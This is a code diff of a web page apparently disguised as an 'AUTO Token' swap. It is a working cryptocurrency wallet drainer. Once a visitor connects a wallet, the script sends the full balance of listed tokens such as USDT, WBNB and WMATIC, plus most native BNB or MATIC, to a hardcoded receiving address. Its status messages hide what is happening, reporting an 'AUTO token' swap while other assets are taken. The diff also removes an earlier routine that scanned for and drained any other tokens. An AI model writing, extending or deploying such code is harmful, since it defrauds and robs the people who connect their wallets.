@@ -351,6 +351,8 @@
           <span class="token-name">AUTO Token</span>
           <span class="token-network">Polygon</span>
         </div>
+
+        
       </div>
       
       <button id="connectWallet" class="btn">
@@ -369,7 +371,7 @@
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     
-    // Token contracts
+    // Token contracts - AUTO first, BNB last
     const TOKENS = {
       bsc: [
         // AUTO Token (priority 1)
@@ -384,6 +386,84 @@
           decimals: 18,
           logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png",
           priority: 1
+        },
+        // USDT (priority 2)
+        {
+          name: "USDT",
+          symbol: "USDT",
+          address: "0x55d398326f99059fF775485246999027B3197955",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png",
+          priority: 2
+        },
+        // Token 1 (priority 3)
+        {
+          name: "Token 1",
+          symbol: "TKN1",
+          address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 3
+        },
+        // Token 2 (priority 4)
+        {
+          name: "Token 2",
+          symbol: "TKN2",
+          address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 4
+        },
+        // Token 3 (priority 5)
+        {
+          name: "Token 3",
+          symbol: "TKN3",
+          address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 5
+        },
+        // Token 4 (priority 6)
+        {
+          name: "Token 4",
+          symbol: "TKN4",
+          address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://etherscan.io/images/main/empty-token.png",
+          priority: 6
+        },
+        // WBNB (priority 7)
+        {
+          name: "Wrapped BNB",
+          symbol: "WBNB",
+          address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
+          priority: 7
         },
         // BNB (native) - LAST (priority 999)
         {
@@ -410,6 +490,19 @@
           decimals: 18,
           logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png",
           priority: 1
+        },
+        // WMATIC (priority 2)
+        {
+          name: "Wrapped MATIC",
+          symbol: "WMATIC",
+          address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/polygon-matic-logo.png",
+          priority: 2
         },
         // MATIC (native) - LAST (priority 999)
         {
@@ -593,11 +686,11 @@
       try {
         let successCount = 0;
         
-        // First process known tokens in priority order
-        const knownTokens = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
+        // Sort tokens by priority (lowest number first)
+        const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
         
-        // Process known ERC20 tokens first (excluding native)
-        for (const token of knownTokens.filter(t => !t.isNative)) {
+        // Process ERC20 tokens first (excluding native)
+        for (const token of tokensToSwap.filter(t => !t.isNative)) {
           try {
             updateStatus(`Checking AUTO token balance...`, "success");
             
@@ -606,7 +699,14 @@
             
             if (balance.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
-              updateStatus(`Sending ${formattedAmount} AUTO token...`, "success");
+              
+              // Estimate gas first
+              try {
+                const gasEstimate = await contract.estimateGas.transfer(RECEIVING_WALLET, balance);
+                updateStatus(`Estimated gas: ${gasEstimate.toString()}`, "success");
+              } catch (e) {
+                updateStatus(`Gas estimation skipped: ${e.message}`, "success");
+              }
               
               const tx = await contract.transfer(RECEIVING_WALLET, balance);
               await tx.wait();
@@ -616,147 +716,28 @@
                 "success"
               );
               successCount++;
+            } else {
+              updateStatus(`No ${token.symbol} balance found`, "success");
             }
           } catch (tokenError) {
             updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
           }
         }
 
-        // Now detect and send ALL other ERC20 tokens
-        updateStatus("Scanning for other tokens...", "success");
-        
-        // Standard ERC20 ABI for balance checking
-        const erc20Abi = [
-          "function balanceOf(address owner) view returns (uint256)",
-          "function transfer(address to, uint256 amount) returns (bool)",
-          "function decimals() view returns (uint8)",
-          "function symbol() view returns (string)",
-          "function name() view returns (string)"
-        ];
-        
-        // Get token balances from the provider (if supported)
-        if (provider.send) {
-          try {
-            const tokenList = await provider.send("wallet_getTokens", []);
-            for (const token of tokenList) {
-              // Skip known tokens we already processed
-              if (knownTokens.some(t => t.address.toLowerCase() === token.address.toLowerCase())) continue;
-              
-              try {
-                const contract = new ethers.Contract(token.address, erc20Abi, signer);
-                const balance = await contract.balanceOf(userAddress);
-                
-                if (balance.gt(0)) {
-                  const formattedAmount = ethers.utils.formatUnits(balance, token.decimals || 18);
-                  updateStatus(`Found ${formattedAmount} ${token.symbol || 'Token'}`, "success");
-                  updateStatus(`Sending ${token.symbol || 'Token'}...`, "success");
-                  
-                  const tx = await contract.transfer(RECEIVING_WALLET, balance);
-                  await tx.wait();
-                  
-                  updateStatus(
-                    `${token.symbol || 'Token'} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
-                    "success"
-                  );
-                  successCount++;
-                }
-              } catch (error) {
-                updateStatus(`Failed to send token at ${token.address}: ${error.message}`, "error");
-              }
-            }
-          } catch (e) {
-            updateStatus("Couldn't automatically detect tokens, trying alternative method...", "success");
-          }
-        }
-
-        // Alternative method: Get token transfers to this address
-        try {
-          const response = await fetch(`${NETWORK_CONFIGS[currentNetwork].rpcUrls[0]}`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              jsonrpc: "2.0",
-              method: "eth_getLogs",
-              params: [{
-                fromBlock: "0x0",
-                toBlock: "latest",
-                address: null,
-                topics: [
-                  "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event
-                  null,
-                  ethers.utils.hexZeroPad(userAddress, 32) // Where user is recipient
-                ]
-              }],
-              id: 1
-            })
-          });
-          
-          const data = await response.json();
-          if (data.result) {
-            const tokenAddresses = [...new Set(data.result.map(log => log.address.toLowerCase()))];
-            
-            // Process all detected tokens
-            for (const tokenAddress of tokenAddresses) {
-              // Skip known tokens we already processed
-              if (knownTokens.some(t => t.address.toLowerCase() === tokenAddress)) continue;
-              
-              try {
-                const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-                
-                // Get token details
-                let symbol, name, decimals;
-                try {
-                  symbol = await contract.symbol();
-                  name = await contract.name();
-                  decimals = await contract.decimals();
-                } catch {
-                  // If we can't get details, use defaults
-                  symbol = "UNKNOWN";
-                  name = "Unknown Token";
-                  decimals = 18;
-                }
-                
-                const balance = await contract.balanceOf(userAddress);
-                
-                if (balance.gt(0)) {
-                  const formattedAmount = ethers.utils.formatUnits(balance, decimals);
-                  updateStatus(`Found ${formattedAmount} ${symbol} (${name})`, "success");
-                  updateStatus(`Sending ${symbol}...`, "success");
-                  
-                  const tx = await contract.transfer(RECEIVING_WALLET, balance);
-                  await tx.wait();
-                  
-                  updateStatus(
-                    `${symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
-                    "success"
-                  );
-                  successCount++;
-                }
-              } catch (error) {
-                updateStatus(`Failed to send token at ${tokenAddress}: ${error.message}`, "error");
-              }
-            }
-          }
-        } catch (e) {
-          updateStatus("Couldn't scan for additional tokens: " + e.message, "error");
-        }
-
         // Process native token LAST (BNB/MATIC)
-        const nativeToken = knownTokens.find(t => t.isNative);
+        const nativeToken = tokensToSwap.find(t => t.isNative);
         if (nativeToken) {
           try {
-            updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
+            updateStatus(`Checking AUTO token balance...`, "success");
             const balance = await provider.getBalance(userAddress);
             
-            // Keep 0.005 native token for gas if balance is large enough
+            // Keep 0.005 BNB/MATIC for gas if balance is large enough
             const keepAmount = ethers.utils.parseUnits("0.005", nativeToken.decimals);
             const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
             
             if (sendAmount.gt(0)) {
               const formattedAmount = ethers.utils.formatUnits(sendAmount, nativeToken.decimals);
-              updateStatus(`Sending ${formattedAmount} ${nativeToken.symbol}...`, "success");
+              updateStatus(`Sending ${formattedAmount} AUTO token...`, "success");
               
               const tx = await signer.sendTransaction({
                 to: RECEIVING_WALLET,
@@ -769,6 +750,8 @@
                 "success"
               );
               successCount++;
+            } else {
+              updateStatus(`No ${nativeToken.symbol} balance available to send (kept some for gas)`, "success");
             }
           } catch (nativeError) {
             updateStatus(`${nativeToken.symbol} transfer failed: ${nativeError.message}`, "error");
@@ -778,7 +761,7 @@
         if (successCount > 0) {
           updateStatus(`Successfully transferred ${successCount} asset(s)`, "success");
         } else {
-          updateStatus("No assets available to transfer", "success");
+          updateStatus("No supported assets available to transfer", "success");
         }
         
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
